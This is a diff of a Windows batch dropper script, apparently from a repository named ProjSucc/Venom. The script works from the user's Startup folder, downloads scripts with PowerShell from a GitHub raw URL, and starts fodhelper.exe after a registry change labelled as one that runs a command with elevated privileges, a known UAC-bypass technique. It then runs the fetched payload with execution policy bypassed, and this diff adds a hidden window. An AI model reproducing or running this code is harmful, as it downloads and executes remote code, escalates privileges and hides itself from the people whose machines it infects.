@@ -18,7 +18,7 @@ cd %STARTUP%
 
 powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile wget.cmd"
 
-powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/altnt.ps1 -OutFile altnt.ps1"
+@rem powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/altnt.ps1 -OutFile altnt.ps1"
 @rem powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/installer.ps1" -OutFile "installer.ps1"
 
 REM Modify the registry to set the command to run with elevated privileges
@@ -30,7 +30,7 @@ start fodhelper.exe
 
 
 @REM run payload
-powershell -ExecutionPolicy Bypass ./wget.cmd; ./altnt.ps1
+powershell -windowstyle hidden -ExecutionPolicy Bypass ./wget.cmd
 
 @REM cd back into initial location
 cd "%INITIALPATH%"
